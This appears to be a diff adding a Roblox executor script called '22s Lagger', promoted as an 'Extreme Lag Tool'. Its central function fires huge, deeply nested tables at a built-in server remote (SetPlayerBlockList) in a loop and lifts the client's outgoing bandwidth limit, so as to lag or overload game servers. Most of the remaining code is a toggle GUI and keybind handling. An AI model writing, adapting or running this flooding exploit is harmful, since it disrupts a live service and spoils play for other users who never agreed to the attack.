@@ -1,0 +1,424 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+
+local player = Players.LocalPlayer
+local ConfigFile = "22sLaggerConfig.json"
+
+local keybind = Enum.KeyCode.V
+local laggerActive = false
+local lagThread = nil
+local statusLabel, toggleButton, keybindButton
+
+local function SaveConfig()
+    local data = { MainKey = keybind.Name }
+    pcall(function()
+        writefile(ConfigFile, HttpService:JSONEncode(data))
+    end)
+end
+
+local function LoadConfig()
+    if pcall(function() return isfile(ConfigFile) end) and isfile(ConfigFile) then
+        local success, fileData = pcall(function() return readfile(ConfigFile) end)
+        if success and fileData and fileData ~= "" then
+            local ok, data = pcall(function() return HttpService:JSONDecode(fileData) end)
+            if ok and data and data.MainKey then
+                keybind = Enum.KeyCode[data.MainKey] or Enum.KeyCode.V
+            end
+        end
+    end
+end
+
+LoadConfig()
+
+local function bomb(amt)
+    local main, spam = {}, {{}}
+    local z = spam[1]
+    
+    for i = 1, amt do 
+        local t = {} 
+        table.insert(z, t) 
+        z = t 
+    end
+    
+    local max = math.min(499999/(amt+2), 1500)
+    for i = 1, max do 
+        table.insert(main, spam) 
+    end
+    
+    pcall(function() 
+        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) 
+    end)
+end
+
+local function toggleLagger()
+    laggerActive = not laggerActive
+    
+    statusLabel.Text = laggerActive and "ON" or "OFF"
+    statusLabel.TextColor3 = laggerActive and Color3.fromRGB(100, 255, 150) or Color3.fromRGB(255, 100, 100)
+    
+    TweenService:Create(toggleButton, TweenInfo.new(0.2), {
+        BackgroundColor3 = laggerActive and Color3.fromRGB(100, 255, 150) or Color3.fromRGB(60, 140, 220)
+    }):Play()
+    
+    if laggerActive then
+        lagThread = task.spawn(function()
+            while laggerActive do
+                pcall(function() 
+                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) 
+                end)
+                bomb(270)
+                task.wait(0.22)
+            end
+        end)
+    elseif lagThread then 
+        task.cancel(lagThread) 
+        lagThread = nil 
+    end
+end
+
+-- Color Scheme
+local C_BG = Color3.fromRGB(10, 10, 10)
+local C_PANEL = Color3.fromRGB(18, 18, 18)
+local C_BORDER = Color3.fromRGB(45, 45, 45)
+local C_ACCENT = Color3.fromRGB(100, 180, 255)
+local C_ACCENT2 = Color3.fromRGB(120, 200, 255)
+local C_TEXT = Color3.fromRGB(240, 245, 255)
+local C_ACTIVE = Color3.fromRGB(60, 140, 220)
+
+-- Cleanup old UI
+if CoreGui:FindFirstChild("22sLagger") then
+    CoreGui:FindFirstChild("22sLagger"):Destroy()
+end
+
+-- GUI Root
+local screenGui = Instance.new("ScreenGui", CoreGui)
+screenGui.Name = "22sLagger"
+screenGui.ResetOnSpawn = false
+
+-- Main Frame
+local mainFrame = Instance.new("Frame", screenGui)
+mainFrame.Size = UDim2.new(0, 340, 0, 280)
+mainFrame.Position = UDim2.new(0.5, -170, 0.5, -140)
+mainFrame.BackgroundColor3 = C_BG
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = false
+mainFrame.ClipsDescendants = true
+
+local mainCorner = Instance.new("UICorner", mainFrame)
+mainCorner.CornerRadius = UDim.new(0, 28)
+
+local mainStroke = Instance.new("UIStroke", mainFrame)
+mainStroke.Thickness = 2.5
+mainStroke.Color = Color3.fromRGB(55, 55, 55)
+
+-- Inner Shadow
+local shadowInner = Instance.new("Frame", mainFrame)
+shadowInner.Size = UDim2.new(1, 4, 1, 4)
+shadowInner.Position = UDim2.new(0, -2, 0, -2)
+shadowInner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+shadowInner.BackgroundTransparency = 0.85
+shadowInner.BorderSizePixel = 0
+shadowInner.ZIndex = 0
+Instance.new("UICorner", shadowInner).CornerRadius = UDim.new(0, 30)
+
+-- Header
+local header = Instance.new("Frame", mainFrame)
+header.Size = UDim2.new(1, 0, 0, 85)
+header.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+header.BorderSizePixel = 0
+header.ZIndex = 2
+
+local headerCorner = Instance.new("UICorner", header)
+headerCorner.CornerRadius = UDim.new(0, 28)
+
+local headerGrad = Instance.new("UIGradient", header)
+headerGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 20)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 10))
+})
+
+local headerDiv = Instance.new("Frame", header)
+headerDiv.Size = UDim2.new(1, 0, 0, 1.5)
+headerDiv.Position = UDim2.new(0, 0, 1, -1.5)
+headerDiv.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+headerDiv.BorderSizePixel = 0
+headerDiv.ZIndex = 3
+
+-- Logo
+local logo = Instance.new("Frame", header)
+logo.Size = UDim2.new(0, 55, 0, 55)
+logo.Position = UDim2.new(0, 18, 0.5, -27.5)
+logo.BackgroundColor3 = C_ACTIVE
+logo.BorderSizePixel = 0
+logo.ZIndex = 3
+
+local logoCorner = Instance.new("UICorner", logo)
+logoCorner.CornerRadius = UDim.new(0, 12)
+
+local logoStroke = Instance.new("UIStroke", logo)
+logoStroke.Color = C_ACCENT2
+logoStroke.Thickness = 2
+
+local logoText = Instance.new("TextLabel", logo)
+logoText.Size = UDim2.new(1, 0, 1, 0)
+logoText.BackgroundTransparency = 1
+logoText.Text = "22s"
+logoText.TextColor3 = C_TEXT
+logoText.Font = Enum.Font.GothamBlack
+logoText.TextSize = 20
+logoText.ZIndex = 4
+
+-- Title
+local title = Instance.new("TextLabel", header)
+title.Size = UDim2.new(0, 240, 0, 30)
+title.Position = UDim2.new(0, 83, 0, 10)
+title.BackgroundTransparency = 1
+title.Text = "LAGGER"
+title.TextColor3 = C_TEXT
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 16
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.ZIndex = 3
+
+-- Subtitle
+local subtitle = Instance.new("TextLabel", header)
+subtitle.Size = UDim2.new(0, 240, 0, 20)
+subtitle.Position = UDim2.new(0, 83, 0, 42)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = "Extreme Lag Tool •.gg/Z7vPrxecnJ"
+subtitle.TextColor3 = Color3.fromRGB(140, 170, 210)
+subtitle.Font = Enum.Font.GothamMedium
+subtitle.TextSize = 10
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+subtitle.ZIndex = 3
+
+-- Close button
+local closeBtn = Instance.new("TextButton", header)
+closeBtn.Size = UDim2.new(0, 32, 0, 32)
+closeBtn.Position = UDim2.new(1, -40, 0.5, -16)
+closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+closeBtn.Text = "X"
+closeBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+closeBtn.Font = Enum.Font.GothamBlack
+closeBtn.TextSize = 14
+closeBtn.AutoButtonColor = false
+closeBtn.BorderSizePixel = 0
+closeBtn.ZIndex = 4
+
+local closeBtnCorner = Instance.new("UICorner", closeBtn)
+closeBtnCorner.CornerRadius = UDim.new(0, 8)
+
+local closeBtnStroke = Instance.new("UIStroke", closeBtn)
+closeBtnStroke.Color = Color3.fromRGB(70, 70, 70)
+closeBtnStroke.Thickness = 1.5
+
+closeBtn.MouseButton1Click:Connect(function() 
+    screenGui:Destroy()
+end)
+
+closeBtn.MouseEnter:Connect(function()
+    TweenService:Create(closeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(180, 40, 40)}):Play()
+    TweenService:Create(closeBtnStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(220, 60, 60)}):Play()
+end)
+
+closeBtn.MouseLeave:Connect(function()
+    TweenService:Create(closeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
+    TweenService:Create(closeBtnStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(70, 70, 70)}):Play()
+end)
+
+-- Content area
+local contentFrame = Instance.new("Frame", mainFrame)
+contentFrame.Size = UDim2.new(1, 0, 1, -85)
+contentFrame.Position = UDim2.new(0, 0, 0, 85)
+contentFrame.BackgroundTransparency = 1
+contentFrame.BorderSizePixel = 0
+contentFrame.ZIndex = 1
+
+local contentPad = Instance.new("UIPadding", contentFrame)
+contentPad.PaddingLeft = UDim.new(0, 18)
+contentPad.PaddingRight = UDim.new(0, 18)
+contentPad.PaddingTop = UDim.new(0, 18)
+contentPad.PaddingBottom = UDim.new(0, 18)
+
+local contentLayout = Instance.new("UIListLayout", contentFrame)
+contentLayout.Padding = UDim.new(0, 14)
+contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+-- Keybind Label
+local keybindLabel = Instance.new("TextLabel", contentFrame)
+keybindLabel.Size = UDim2.new(1, 0, 0, 18)
+keybindLabel.BackgroundTransparency = 1
+keybindLabel.Text = "TOGGLE KEY:"
+keybindLabel.TextColor3 = C_ACCENT2
+keybindLabel.Font = Enum.Font.GothamBold
+keybindLabel.TextSize = 10
+keybindLabel.LayoutOrder = 1
+
+-- Keybind Button
+keybindButton = Instance.new("TextButton", contentFrame)
+keybindButton.Size = UDim2.new(1, 0, 0, 42)
+keybindButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+keybindButton.Text = keybind.Name
+keybindButton.TextColor3 = C_ACCENT
+keybindButton.Font = Enum.Font.GothamBold
+keybindButton.TextSize = 15
+keybindButton.AutoButtonColor = false
+keybindButton.BorderSizePixel = 0
+keybindButton.LayoutOrder = 2
+
+local keybindCorner = Instance.new("UICorner", keybindButton)
+keybindCorner.CornerRadius = UDim.new(0, 9)
+
+local keybindStroke = Instance.new("UIStroke", keybindButton)
+keybindStroke.Color = Color3.fromRGB(70, 70, 70)
+keybindStroke.Thickness = 1.5
+
+local listeningFor = false
+
+keybindButton.MouseButton1Click:Connect(function()
+    listeningFor = true
+    keybindButton.Text = "..."
+    keybindButton.TextColor3 = Color3.fromRGB(255, 100, 100)
+end)
+
+keybindButton.MouseEnter:Connect(function()
+    if not listeningFor then
+        TweenService:Create(keybindButton, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(25, 35, 58)}):Play()
+    end
+end)
+
+keybindButton.MouseLeave:Connect(function()
+    if not listeningFor then
+        TweenService:Create(keybindButton, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(20, 20, 20)}):Play()
+    end
+end)
+
+-- Divider
+local divider = Instance.new("Frame", contentFrame)
+divider.Size = UDim2.new(1, 0, 0, 1)
+divider.BackgroundColor3 = C_BORDER
+divider.BorderSizePixel = 0
+divider.LayoutOrder = 3
+
+-- Status Card
+local statusCard = Instance.new("Frame", contentFrame)
+statusCard.Size = UDim2.new(1, 0, 0, 50)
+statusCard.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+statusCard.BorderSizePixel = 0
+statusCard.LayoutOrder = 4
+
+local statusCorner = Instance.new("UICorner", statusCard)
+statusCorner.CornerRadius = UDim.new(0, 9)
+
+local statusStroke = Instance.new("UIStroke", statusCard)
+statusStroke.Color = Color3.fromRGB(70, 70, 70)
+statusStroke.Thickness = 1.5
+
+-- Status Label
+local laggerText = Instance.new("TextLabel", statusCard)
+laggerText.Size = UDim2.new(0, 100, 0, 50)
+laggerText.Position = UDim2.new(0, 12, 0, 0)
+laggerText.BackgroundTransparency = 1
+laggerText.Text = "LAGGER:"
+laggerText.TextColor3 = C_TEXT
+laggerText.Font = Enum.Font.GothamBold
+laggerText.TextSize = 13
+laggerText.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Status Value
+statusLabel = Instance.new("TextLabel", statusCard)
+statusLabel.Size = UDim2.new(0, 80, 0, 50)
+statusLabel.Position = UDim2.new(0, 110, 0, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "OFF"
+statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+statusLabel.Font = Enum.Font.GothamBlack
+statusLabel.TextSize = 13
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Toggle Button
+toggleButton = Instance.new("TextButton", statusCard)
+toggleButton.Size = UDim2.new(0, 44, 0, 40)
+toggleButton.Position = UDim2.new(1, -56, 0.5, -20)
+toggleButton.BackgroundColor3 = C_ACTIVE
+toggleButton.Text = ""
+toggleButton.AutoButtonColor = false
+toggleButton.BorderSizePixel = 0
+
+local toggleCorner = Instance.new("UICorner", toggleButton)
+toggleCorner.CornerRadius = UDim.new(0, 8)
+
+local toggleStroke = Instance.new("UIStroke", toggleButton)
+toggleStroke.Color = C_ACCENT2
+toggleStroke.Thickness = 2
+
+toggleButton.MouseButton1Click:Connect(function()
+    toggleLagger()
+end)
+
+toggleButton.MouseEnter:Connect(function()
+    if not laggerActive then
+        TweenService:Create(toggleButton, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(80, 160, 255)}):Play()
+    end
+end)
+
+toggleButton.MouseLeave:Connect(function()
+    if not laggerActive then
+        TweenService:Create(toggleButton, TweenInfo.new(0.1), {BackgroundColor3 = C_ACTIVE}):Play()
+    end
+end)
+
+-- Dragging
+local dragging = false
+local dragStart, startPos
+
+header.InputBegan:Connect(function(input) 
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then 
+        dragging = true 
+        dragStart = input.Position 
+        startPos = mainFrame.Position 
+    end 
+end)
+
+UserInputService.InputChanged:Connect(function(input) 
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart 
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end 
+end)
+
+header.InputEnded:Connect(function(input) 
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then 
+        dragging = false 
+    end 
+end)
+
+-- Keybind Input
+UserInputService.InputBegan:Connect(function(input, processed)
+    if processed then return end
+    
+    if listeningFor then
+        if input.KeyCode and input.KeyCode ~= Enum.KeyCode.Unknown then
+            keybind = input.KeyCode
+            keybindButton.Text = input.KeyCode.Name
+            keybindButton.TextColor3 = C_ACCENT
+            listeningFor = false
+            SaveConfig()
+        end
+    elseif input.KeyCode == keybind then 
+        toggleLagger()
+    elseif input.KeyCode == Enum.KeyCode.LeftControl then 
+        mainFrame.Visible = not mainFrame.Visible
+    end
+end)
+
+-- Pop-in animation
+mainFrame.ClipsDescendants = true
+mainFrame.Size = UDim2.new(0, 340, 0, 0)
+TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, 340, 0, 280)}):Play()
+
+print("22s Lagger loaded!")
